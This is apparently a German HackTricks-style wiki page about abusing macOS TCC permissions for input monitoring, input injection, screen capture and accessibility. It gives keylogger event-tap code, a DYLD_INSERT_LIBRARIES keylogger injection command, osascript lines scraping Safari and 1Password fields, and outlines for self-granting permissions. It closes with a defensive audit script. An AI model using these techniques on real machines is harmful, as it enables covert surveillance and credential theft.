# macOS Input-Überwachung, Bildschirmaufnahme & Accessibility-Missbrauch

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Drei verwandte TCC-Services steuern, wie Anwendungen den Desktop des Benutzers beobachten und mit ihm interagieren können:

| TCC Service | Berechtigung | Fähigkeit |
|---|---|---|
| `kTCCServiceListenEvent` | **Input-Überwachung** | Liest alle Tastatur- und Mausereignisse systemweit (keylogging) |
| `kTCCServicePostEvent` | **Input-Injektion** | Injiziert synthetische Tastatur- und Mausereignisse |
| `kTCCServiceScreenCapture` | **Bildschirmaufnahme** | Liest den Display-Buffer, erstellt Screenshots, zeichnet den Bildschirm auf |
| `kTCCServiceAccessibility` | **Bedienungshilfen** | Steuert andere Anwendungen über die AXUIElement API, liest UI-Elemente |

Diese Berechtigungen sind die gefährlichste Kombination auf macOS — zusammen ermöglichen sie:
- Vollständiges Keylogging aller Tastenanschläge (Passwörter, Nachrichten, Kreditkarten)
- Bildschirmaufzeichnung aller sichtbaren Inhalte
- Synthetische Eingabeinjektion (Buttons anklicken, Dialoge bestätigen)
- Vollständige GUI-Steuerung, gleichwertig mit physischem Zugriff

---

## Input-Überwachung (kTCCServiceListenEvent)

### Wie es funktioniert

macOS verwendet die **`CGEventTap` API**, damit Prozesse Eingabeereignisse aus dem Quartz-Event-System abfangen können. Ein Prozess mit ListenEvent-Berechtigung kann einen Event-Tap erstellen, der **jedes Tastatur- und Mausereignis** empfängt, bevor oder nachdem es die Zielanwendung erreicht.
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Entitled Binaries finden
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Angriff: Keylogging via Code Injection

Wenn ein binary mit ListenEvent-Berechtigung außerdem **disabled library validation** hat oder **allows DYLD environment variables**, kann ein Angreifer eine dylib injizieren, die einen CGEventTap registriert:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
Die injizierte dylib erbt die ListenEvent-TCC-Berechtigung des Ziels und erfasst alle Tastenanschläge.

### Angriff: Credential Harvesting

Ein ausgeklügelter keylogger kann Tastenanschläge der aktiven Anwendung zuordnen:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### Wie es funktioniert

Die PostEvent-Berechtigung erlaubt das Erstellen eines Event-Taps mit **`kCGEventTapOptionDefault`** (can modify/inject events) statt ListenOnly. Dies ermöglicht:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Angriff: Automated TCC Prompt Approval

Mit PostEvent kann ein Angreifer **das Klicken auf "Allow" simulieren** bei TCC-Berechtigungsdialogen:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Bildschirmaufnahme (kTCCServiceScreenCapture)

### Funktionsweise

Die Berechtigung für Bildschirmaufnahmen ermöglicht das Auslesen des Display-Buffers mit:
- **`CGWindowListCreateImage`** — erfasst jedes Fenster oder den gesamten Bildschirm
- **`ScreenCaptureKit`** (macOS 12.3+) — moderne API zum Streamen von Bildschirm-Inhalten
- **`CGDisplayStream`** — hardwarebeschleunigte Bildschirmaufnahme
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Auffinden von Screen-Capture-Clients
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Credential Capture via OCR

Ein injizierter Screen-Capture-Prozess kann periodisch Frames erfassen und OCR verwenden, um Passwörter zu extrahieren:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> Beginnend mit **macOS Sonoma** zeigt die Bildschirmaufnahme einen **dauerhaften Indikator** in der Menüleiste. Bei älteren Versionen konnte die Bildschirmaufzeichnung völlig still erfolgen. Eine kurze Einzelbildaufnahme kann vom Benutzer jedoch weiterhin unbemerkt bleiben.
 
### Angriff: Session Recording

Kontinuierliche Bildschirmaufzeichnung ermöglicht eine vollständige Wiedergabe der Sitzung des Benutzers:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibility (kTCCServiceAccessibility)

### Funktionsweise

Der Accessibility-Zugriff gewährt Kontrolle über andere Anwendungen über die **AXUIElement API**. Ein Prozess mit Accessibility-Rechten kann:

1. **Lesen** jedes UI-Elements in jeder Anwendung (Textfelder, Beschriftungen, Schaltflächen, Menüs)
2. **Klicken** auf Schaltflächen und Interagieren mit Steuerelementen
3. **Text eingeben** in jedes Textfeld
4. **Navigieren** in Menüs und Dialogen
5. **Auslesen** angezeigter Daten aus jeder laufenden Anwendung
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

Der gefährlichste Accessibility-Missbrauch ist **navigating System Settings to grant your own malware additional permissions**:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Angriff: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Angriff: Automatisierte Benutzeraktionen
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Angriffsketten

### Kette: Input Monitoring + Screen Capture = Vollständige Überwachung
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Kette: Accessibility + PostEvent = Vollständige Fernsteuerung
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Kette: Accessibility → Self-Grant Camera/Mic → Surveillance
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
## Erkennung & Enumeration
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## Referenzen

* [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
* [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
* [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
* [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
